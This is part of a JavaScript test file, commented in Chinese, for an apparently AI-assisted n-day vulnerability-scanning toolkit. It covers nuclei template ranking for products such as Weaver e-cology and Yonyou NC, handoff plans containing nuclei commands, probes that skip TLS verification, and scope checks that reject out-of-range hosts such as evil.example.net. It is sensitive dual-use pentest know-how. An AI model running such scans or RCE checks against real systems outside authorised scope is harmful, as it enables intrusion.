  fs.writeFileSync(path.join(realTpl, 'http', 'exposed-panels', 'sap-netweaver-cet-detect.yaml'), 'id: sap')
  fs.mkdirSync(path.dirname(linkTpl), { recursive: true })
  fs.symlinkSync(realTpl, linkTpl, 'junction')

  const prevHome = process.env.USERPROFILE
  process.env.USERPROFILE = home
  try {
    // 「有 yaml 才算数」+ 符号链接必须解析成 realpath（Windows 版 nuclei 不跟符号链接）
    const dir = resolveNucleiTemplatesDir()
    expect('模板目录解析为 realpath（不是符号链接本身）', dir === fs.realpathSync(realTpl), dir)

    // 空目录不能被当成有效模板库（会让 nuclei 联网初始化并卡死）
    const emptyHome = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-empty-'))
    fs.mkdirSync(path.join(emptyHome, '.config', 'nuclei', 'templates'), { recursive: true })
    fs.writeFileSync(path.join(emptyHome, '.config', 'nuclei', 'templates', 'readme.txt'), 'no templates')
    process.env.USERPROFILE = emptyHome
    expect('空模板目录不算有效', resolveNucleiTemplatesDir() === '')
    fs.rmSync(emptyHome, { recursive: true, force: true })
    process.env.USERPROFILE = home

    const matched = matchNucleiTemplates(dir, ['weaver', 'ecology'])
    expect('按关键词挑出对得上的模板', matched.length === 2, JSON.stringify(matched.map((p) => path.basename(p))))
    expect('不相关厂商目录的模板不被选中', matched.every((p) => !p.includes('other-product')))
    expect('token 边界：SAP NetWeaver 不被 "weaver" 误选（不做裸子串匹配）',
      matched.every((p) => !p.includes('netweaver')), JSON.stringify(matched.map((p) => path.basename(p))))

    // 工具端到端
    const handoff = toolDefs.get('nday_handoff')
    expect('注册了 nday_handoff', handoff !== undefined)
    const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-handoff-'))
    const out = await handoff.execute({ entryId: 'weaver-ecology-dubboapi-debug-rce', asset: 'http://127.0.0.1:18098', scope: '127.0.0.1', workspace: ws })
    expect('交接单生成成功', out.ok, out.error)
    expect('给出了可直接执行的 nuclei 命令',
      typeof out.nucleiCommand === 'string' && out.nucleiCommand.includes('-t "')
      && out.nucleiCommand.includes('-u http://127.0.0.1:18098'), out.nucleiCommand)
    expect('命令用保守速率（-rl 15）', out.nucleiCommand.includes('-rl 15'))
    expect('模型侧文本说明只出计划不执行', out.text.includes('只出计划'))
    const planPath = path.join(ws, out.planFile)
    expect('交接单落盘', fs.existsSync(planPath))
    const plan = fs.readFileSync(planPath, 'utf8')
    expect('落盘内容含纪律与未复现标注',
      plan.includes('我方尚未复现') && plan.includes('不执行、不投载荷'))
    expect('evidence-index 记录交接', fs.readFileSync(path.join(ws, 'evidence-index.md'), 'utf8').includes('nday_handoff'))

    // 没有关键词 → 老实说"没找到"，不编模板
    const none = await handoff.execute({ entryId: 'seeyon-oa-workflow-importprocess-rce', asset: 'http://127.0.0.1', scope: '127.0.0.1', workspace: ws, keywords: 'zzz-nothing' })
    expect('无匹配模板时如实说明', none.ok && none.templates === 0 && none.text.includes('没有对得上的模板'))

    // 模板直通模式：产品在**模板层有存货、语料层没条目**时（覆盖缺口表里那一档），
    // 交接不能因为「没有 entryId」就断掉——否则整条流水线停在这一步。
    const direct = await handoff.execute({ asset: 'http://127.0.0.1:18097', scope: '127.0.0.1', workspace: ws, keywords: 'weaver' })
    expect('模板直通：无 entryId 也能出交接单',
      direct.ok && direct.mode === 'template-direct' && direct.entryId === null && direct.templates >= 1,
      JSON.stringify({ mode: direct.mode, templates: direct.templates, error: direct.error }))
    expect('模板直通交接单写明「无条目」而不是编一个产品名',
      fs.readFileSync(path.join(ws, direct.planFile), 'utf8').includes('模板直通')
      && direct.text.includes('模板直通'))
    expect('既无 entryId 又无 keywords 时明确报错',
      (await handoff.execute({ asset: 'http://x', scope: '127.0.0.1', workspace: ws })).error.includes('keywords'))
    expect('nday_handoff 拒绝未限定范围和越界目标',
      (await handoff.execute({ asset: 'http://127.0.0.1:18097', workspace: ws, keywords: 'weaver' })).error.includes('scope')
      && (await handoff.execute({ asset: 'http://evil.example.net', scope: 'example.com', workspace: ws, keywords: 'weaver' })).error.includes('精确范围'))
    expect('带 entryId 时仍走条目模式', out.mode === 'entry' && out.entryId === 'weaver-ecology-dubboapi-debug-rce')
    fs.rmSync(ws, { recursive: true, force: true })
  } finally {
    process.env.USERPROFILE = prevHome
    fs.rmSync(home, { recursive: true, force: true })
  }
}

// ── 8b. 交接模板按**区分度**排序：产品专属模板不能被通用词挤出名额 ──────────────
// 回归背景（2026-09-25 真机实测）：语料关键词里混着产品词与漏洞类词
// （`sqli` / `rce` / `panel` / `cve` …）。旧实现把命中结果按**字母序**取前 40，
// 通用词能命中几百个模板、产品目录名又大多排在字母表后半段 → 专属模板被整个挤出。
// 实测 322 条有专属模板的条目里 **61 条（19%）** 的交接命令一条专属模板都没带上
// （例：`yonyou-nc-bshservlet-rce` 有 31 条用友模板，全被 `rce` 的 165 条通用模板挤掉）。
{
  const { matchNucleiTemplates, scoreNucleiTemplates } = await import('../lib/index.js')
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-rank-'))
  const lib = path.join(home, 'real-templates')
  // 50 个字母序靠前的通用 sqli 模板——旧行为会把 40 个名额全占掉
  fs.mkdirSync(path.join(lib, 'http', 'vulnerabilities', 'aaa-generic'), { recursive: true })
  for (let i = 0; i < 50; i += 1) {
    fs.writeFileSync(path.join(lib, 'http', 'vulnerabilities', 'aaa-generic', `aaa-sqli-${String(i).padStart(2, '0')}.yaml`), 'id: g')
  }
  // 1 个产品专属模板，路径字母序排在最后
  fs.mkdirSync(path.join(lib, 'http', 'vulnerabilities', 'yonyou'), { recursive: true })
  fs.writeFileSync(path.join(lib, 'http', 'vulnerabilities', 'yonyou', 'yonyou-nc-bshservlet-sqli.yaml'), 'id: y')
  fs.mkdirSync(path.join(home, '.config', 'nuclei'), { recursive: true })
  fs.symlinkSync(lib, path.join(home, '.config', 'nuclei', 'templates'), 'junction')

  const prevHome = process.env.USERPROFILE
  process.env.USERPROFILE = home
  try {
    const ranked = matchNucleiTemplates(lib, ['yonyou', 'sqli'], { limit: 40 })
    expect('产品专属模板进得了交接名单（不再被通用词挤掉）',
      ranked.some((p) => p.includes('yonyou-nc-bshservlet-sqli')), JSON.stringify(ranked.slice(0, 3).map((p) => path.basename(p))))
    expect('专属模板排在第一位（有区分度的词权重更高）',
      path.basename(ranked[0] ?? '') === 'yonyou-nc-bshservlet-sqli.yaml', path.basename(ranked[0] ?? ''))
    const detail = scoreNucleiTemplates(lib, ['yonyou', 'sqli'], { limit: 40 })
    expect('scoreNucleiTemplates 报出专属命中数',
      detail.specific.length === 1 && detail.genericOnly === false,
      JSON.stringify({ specific: detail.specific.length, genericOnly: detail.genericOnly }))
    expect('通用词（sqli）被识别为不具区分度、产品词不是',
      detail.perKeyword.sqli === 51 && detail.perKeyword.yonyou === 1, JSON.stringify(detail.perKeyword))

    // 只有通用词命中：交接单必须**如实说明**，不能把通用模板当产品指纹交接
    const handoff = toolDefs.get('nday_handoff')
    const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-rank-ws-'))
    const genericOnly = await handoff.execute({ asset: 'http://127.0.0.1:18096', scope: '127.0.0.1', workspace: ws, keywords: 'sqli' })
    expect('只有通用词命中时 genericOnly=true 且 specific 为空',
      genericOnly.templatesGenericOnly === true && genericOnly.templatesSpecific === 0,
      JSON.stringify({ genericOnly: genericOnly.templatesGenericOnly, specific: genericOnly.templatesSpecific }))
    expect('交接单如实写明「本机没有该产品的专属模板」',
      genericOnly.text.includes('全是通用词凑的') || genericOnly.text.includes('专属模板'),
      genericOnly.text.slice(0, 200))
    const plan = fs.readFileSync(path.join(ws, genericOnly.planFile), 'utf8')
    expect('落盘交接单同样写明通用词警告',
      plan.includes('全是靠通用词凑上的'), plan.slice(plan.indexOf('## 2.'), plan.indexOf('## 2.') + 240))

    // 计数不能被 limit 静默封顶：命中 51 个就该报 51，而不是 limit 的 5/40
    const capped = scoreNucleiTemplates(lib, ['sqli'], { limit: 5 })
    expect('total 报未截断的命中总数（不是 limit）',
      capped.total === 51 && capped.templates.length === 5,
      JSON.stringify({ total: capped.total, listed: capped.templates.length }))
    const coverage = toolDefs.get('nday_coverage')
    const cov = await coverage.execute({ keyword: 'sqli', workspace: ws })
    expect('覆盖体检的模板层计数不再被 limit 封顶',
      cov.l3.total === 51, JSON.stringify(cov.l3))
    fs.rmSync(ws, { recursive: true, force: true })
  } finally {
    process.env.USERPROFILE = prevHome
    fs.rmSync(home, { recursive: true, force: true })
  }
}

// ── 9. 用户层语料：现场学到的 Nday 能落库，且下一轮就被带上 ─────────────────────
{
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-home-layer-'))
  const prevHome = process.env.DSH_HOME
  process.env.DSH_HOME = home
  try {
    const learn = toolDefs.get('nday_learn')
    const catalogTool2 = toolDefs.get('nday_catalog')
    expect('注册了 nday_learn', learn !== undefined)

    const base = {
      id: 'demo-product-demo-rce',
      product: '演示产品',
      vendor: '演示厂商',
      vulnClass: '未认证 RCE',
      status: 'normalized',
      auth: 'none',
      affectedVersions: ['1.0'],
      lastReviewed: '2026-09-24',
      sources: [{ url: 'https://example.com/advisory', kind: 'advisory', title: '公告' }],
    }

    // 诚实性门禁：声称 normalized 却没有探针 → 拒收
    const noProbe = await learn.execute({ entry: JSON.stringify(base) })
    expect('normalized 没有探针时拒收', noProbe.ok === false && noProbe.error.includes('机器可判定探针'), noProbe.error)

    // 诚实性门禁：声称 verified 却没有复现证据 → 拒收
    const fakeVerified = await learn.execute({
      entry: JSON.stringify({ ...base, status: 'verified', fingerprint: { probes: [{ id: 'p', path: '/', method: 'GET', expect: { statusNotIn: [404] }, weight: 'weak', note: 'n' }] } }),
    })
    expect('verified 没有复现证据时拒收', fakeVerified.ok === false && fakeVerified.error.includes('reproduced'), fakeVerified.error)

    // 合法条目 → 落用户层
    const good = await learn.execute({
      entry: JSON.stringify({
        ...base,
        fingerprint: { paths: ['/demo'], probes: [{ id: 'demo-presence', path: '/demo', method: 'GET', expect: { statusNotIn: [404] }, weight: 'weak', note: '存在性旁证' }] },
      }),
      note: '来源：现场检索到的 GitHub 项目',
    })
    expect('合法条目落库成功', good.ok && good.action === 'added', good.error)
    const userCatalog = path.join(home, 'refs', 'pentest', 'nday', 'catalog.json')
    expect('用户层 catalog 已写出', fs.existsSync(userCatalog))
    expect('用户层条目文档已写出', fs.existsSync(path.join(home, 'refs', 'pentest', 'nday', 'entries', 'demo-product-demo-rce.md')))

    // 合并读取：包层条目 + 用户层条目同时可见
    const listed = await catalogTool2.execute({ keyword: '演示' })
    expect('nday_catalog 能读到用户层条目', listed.ok && listed.text.includes('demo-product-demo-rce'), listed.text.slice(0, 200))
    const rows = await catalogTool2.execute({ keyword: '演示' })
    expect('用户层条目被标为 user 来源',
      JSON.stringify(rows.entries ?? []).includes('"source":"user"'), JSON.stringify(rows.entries ?? []).slice(0, 200))
    const bundledStillThere = await catalogTool2.execute({ keyword: 'TongWeb' })
    expect('包层条目不受影响', bundledStillThere.ok && bundledStillThere.text.includes('tongtech-tongweb'), bundledStillThere.text.slice(0, 160))

    // 关键一环：**学到的条目要真的能被打出来**。只验「catalog 读得到」不够——
    // 若 nday_match 哪天不再走合并语料，「落库了但匹配不到」会静默失效。
    {
      const demoServer = http.createServer((req, res) => {
        if (new URL(req.url ?? '/', 'http://x').pathname === '/demo') { res.writeHead(200); res.end('demo'); return }
        res.writeHead(404, { 'content-type': 'text/plain' }); res.end('not found')
      })
      const demoPort = await listen(demoServer)
      const demoWs = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-learn-match-'))
      try {
        const matched = await toolDefs.get('nday_match').execute({
          targets: `http://127.0.0.1:${demoPort}`,
          workspace: demoWs,
          entryIds: 'demo-product-demo-rce',
        })
        const matchedRow = (matched.rows ?? [])[0]
        expect('学到的用户层条目能被 nday_match 打出来（更新链路闭环）',
          matched.ok === true && matchedRow !== undefined
          && (matchedRow.evidence ?? []).some((e) => e.probeId === 'demo-presence'),
          JSON.stringify(matched.rows ?? []))
      } finally {
        await close(demoServer)
        fs.rmSync(demoWs, { recursive: true, force: true })
      }
    }

    // 同 id 再写一次 → 更新而不是重复
    const again = await learn.execute({ entry: JSON.stringify({ ...base, fingerprint: { probes: [{ id: 'demo-presence', path: '/demo', method: 'GET', expect: { statusNotIn: [404] }, weight: 'weak', note: 'n' }] } }) })
    expect('同 id 再写是更新不是重复', again.ok && again.action === 'updated', again.action)
    const parsed = JSON.parse(fs.readFileSync(userCatalog, 'utf8'))
    expect('用户层里该 id 只有一条', parsed.entries.filter((e) => e.id === 'demo-product-demo-rce').length === 1)
  } finally {
    process.env.DSH_HOME = prevHome
    fs.rmSync(home, { recursive: true, force: true })
  }
}

// ── 10. 覆盖体检：三层来源数得清，空的层要能被看出来 ───────────────────────────
{
  const { coverageScan } = await import('../lib/index.js')
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-cov-'))
  const imports = path.join(home, 'imports')
  fs.mkdirSync(path.join(imports, 'pack-a'), { recursive: true })
  fs.writeFileSync(path.join(imports, 'pack-a', '泛微 文件上传.md'), 'x')
  fs.writeFileSync(path.join(imports, 'pack-a', '无关内容.md'), 'x')
  const tplDir = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-tpl-'))
  fs.writeFileSync(path.join(tplDir, 'weaver-x.yaml'), 'id: x')

  const entries = [
    { id: 'weaver-a', product: '泛微 e-cology', vendor: '泛微', aliases: ['weaver', 'ecology'], status: 'normalized', fingerprint: { probes: [{}] } },
    { id: 'tongweb-b', product: '东方通 TongWeb', vendor: '东方通', aliases: [], status: 'normalized', fingerprint: { probes: [] } },
  ]
  const cov = coverageScan({ keyword: '泛微', catalogEntries: entries, importsDir: imports, nucleiDir: tplDir })
  expect('覆盖体检：语料层计数与"可筛"区分正确', cov.l1.total === 1 && cov.l1.siftable === 1, JSON.stringify(cov.l1))
  expect('覆盖体检：知识包层按文件名计数', cov.l2.total === 1 && cov.l2.packs['pack-a'] === 1, JSON.stringify(cov.l2))
  expect('覆盖体检：模板层计数正确（中文关键词经别名扩展到 weaver）',
    cov.l3.total === 1 && cov.searchTerms.includes('weaver'), JSON.stringify({ l3: cov.l3, terms: cov.searchTerms }))

  const onlyClue = coverageScan({ keyword: '东方通', catalogEntries: entries, importsDir: imports, nucleiDir: tplDir })
  expect('覆盖体检：只有线索条目时 siftable=0（提示要走人工整理）',
    onlyClue.l1.total === 1 && onlyClue.l1.siftable === 0, JSON.stringify(onlyClue.l1))
  const empty = coverageScan({ keyword: '宝兰德', catalogEntries: entries, importsDir: imports, nucleiDir: tplDir })
  expect('覆盖体检：三层全空时三项都是 0',
    empty.l1.total === 0 && empty.l2.total === 0 && empty.l3.total === 0, JSON.stringify(empty))
  fs.rmSync(home, { recursive: true, force: true })
  fs.rmSync(tplDir, { recursive: true, force: true })
}

// ── 探针传输层：TLS 策略与失败原因（2026-09-25 实测补的）────────────────────
// 背景：探针原用全局 `fetch`，在**自签名证书**目标上 100% 传输失败、rows 为空，
// 而输出只把它概括成「超时/拒连」——批量筛查在这些目标上等于整条不可用。
{
  const httpsOpts = probeRequestOptions('https://self-signed.example/', 'GET', 6000)
  expect('探针（HTTPS）：关闭证书校验（自签名/过期证书目标可用）',
    httpsOpts.options.rejectUnauthorized === false, JSON.stringify(httpsOpts.options))
  const httpOpts = probeRequestOptions('http://plain.example/', 'GET', 6000)
  expect('探针（HTTP）：不带 TLS 选项（别把 TLS 参数塞给明文连接）',
    !('rejectUnauthorized' in httpOpts.options) && httpOpts.mod === http,
    JSON.stringify(httpOpts.options))
  expect('探针：一次性连接 + 精确超时（避开 keep-alive 导致的偶发 404/500 假拒绝）',
    httpsOpts.options.agent === false && httpsOpts.options.timeout === 6000,
    JSON.stringify(httpsOpts.options))

  // vhost：账本 target 是 IP、host 是域名时必须显式发 Host，否则打到默认站点。
  expect('vhost：Host 按目标端口补全',
    probeRequestOptions('http://10.0.0.1:8080/', 'GET', 6000, { hostHeader: 'oa.example.com' }).options.headers.host === 'oa.example.com:8080')
  expect('vhost：账本 host 自带端口时先剥掉再加目标端口',
    probeRequestOptions('http://10.0.0.1:8080/', 'GET', 6000, { hostHeader: 'oa.example.com:80' }).options.headers.host === 'oa.example.com:8080')
  expect('vhost：默认端口不加端口后缀',
    probeRequestOptions('http://10.0.0.1/', 'GET', 6000, { hostHeader: 'oa.example.com' }).options.headers.host === 'oa.example.com')
  expect('vhost：没有 hostHeader 时不设 Host（沿用 URL 主机）',
    probeRequestOptions('http://10.0.0.1/', 'GET', 6000).options.headers.host === undefined)

  // 账本的 port 是独立字段：探测前必须补进 base，否则打到默认端口（实测真实 8589 → 打到 80 拒连）。
  expect('端口补全：target 无端口时按 port 补',
    probeBaseForAsset({ target: '127.0.0.1', port: 8589 }) === 'http://127.0.0.1:8589',
    probeBaseForAsset({ target: '127.0.0.1', port: 8589 }))
  expect('端口补全：默认端口不加后缀',
    probeBaseForAsset({ target: '127.0.0.1', port: 80 }) === 'http://127.0.0.1')
  expect('端口补全：https 默认端口不加后缀，且按 protocol 纠正 scheme',
    probeBaseForAsset({ target: '127.0.0.1', port: 443, protocol: 'https' }) === 'https://127.0.0.1',
    probeBaseForAsset({ target: '127.0.0.1', port: 443, protocol: 'https' }))
  expect('端口补全：target 已显式写端口时不覆盖',
    probeBaseForAsset({ target: 'https://h:8443', port: 8080 }) === 'https://h:8443',
    probeBaseForAsset({ target: 'https://h:8443', port: 8080 }))

  // 探针直连（node:http/https 不读 HTTP_PROXY）：检测到的代理变量必须能被如实报出来。
  expect('代理检测：大小写都认，且去重后按变量名返回',
    detectProxyEnv({ HTTP_PROXY: 'http://p:8080', https_proxy: 'http://p:8080', NO_PROXY: 'internal' }).join(',') === 'HTTP_PROXY,HTTPS_PROXY,NO_PROXY',
    JSON.stringify(detectProxyEnv({ HTTP_PROXY: 'http://p:8080', https_proxy: 'http://p:8080', NO_PROXY: 'internal' })))
  expect('代理检测：没设代理时返回空数组', detectProxyEnv({}).length === 0)

  expect('传输失败翻译：拒连 → 可行动原因',
    describeTransportError({ code: 'ECONNREFUSED' }, 6000) === '连接被拒绝（端口未开放）')
  expect('传输失败翻译：真因在 error.cause 里也要取到（fetch 只给 "fetch failed"）',
    describeTransportError({ message: 'fetch failed', cause: { code: 'DEPTH_ZERO_SELF_SIGNED_CERT' } }, 6000) === 'TLS 证书自签名（未受信任）')
  expect('传输失败翻译：超时带上毫秒数',
    describeTransportError({ code: 'ETIMEDOUT' }, 6000) === '超时（6000ms）')
  expect('传输失败摘要：按原因归类并计数（全部失败时模型仍能看到为什么）',
    summarizeTransportErrors([{ error: 'A' }, { error: 'A' }, { error: 'B' }]) === 'A×2；B')

  // 响应体字符集：信创/国产系统大量返回 GBK，而判据里有中文串。
  // 只按 UTF-8 解码时，金蝶 Apusic 那条中文标题探针在真实目标上永远打不中。
  const apusicGbk = Buffer.from('bbb6d3adcab9d3c3417075736963d3a6d3c3b7fecef1c6f7', 'hex')
  expect('响应体解码：GBK 页面里的中文判据能解出来',
    decodeProbeBody(apusicGbk, 'text/html; charset=gbk') === '欢迎使用Apusic应用服务器')
  expect('响应体解码：gb2312 别名映射到 gbk',
    decodeProbeBody(apusicGbk, 'text/html; charset=gb2312') === '欢迎使用Apusic应用服务器')
  expect('响应体解码：没有 charset 时按 UTF-8',
    decodeProbeBody(Buffer.from('ok', 'utf8'), 'text/html') === 'ok')
  expect('响应体解码：未知 charset 不抛错（退 UTF-8）',
    decodeProbeBody(Buffer.from('ok', 'utf8'), 'text/html; charset=made-up-charset') === 'ok')

  // 重定向：同主机跟随、跨主机不跟随，两种都必须在证据里如实写出来
  // （否则「跟随后仍不匹配」与「压根没跟随」在证据里长得一样）。
  const followed = evaluateProbe(
    { weight: 'weak', expect: { statusNotIn: [404] } },
    { status: 200, body: '', headers: {}, redirect: { followed: true, chain: ['http://h/home'], finalUrl: 'http://h/home' } },
  )
  expect('重定向证据：同主机跟随后写在理由里',
    followed.hit === true && followed.reason.includes('跟随 1 次同主机重定向'), followed.reason)
  const notFollowed = evaluateProbe(
    { weight: 'weak', expect: { bodyContainsAny: ['x'] } },
    { status: 302, body: '', headers: {}, redirect: { followed: false, to: 'http://evil.example/home', reason: '跨主机' } },
  )
  expect('重定向证据：跨主机未跟随也要写在理由里（含未命中）',
    notFollowed.hit === false && notFollowed.reason.includes('被重定向到 http://evil.example/home（跨主机，未跟随）'), notFollowed.reason)
}

console.log(failed === 0 ? `\nall tests passed` : `\n${failed} FAILED`)
process.exit(failed ? 1 : 0)
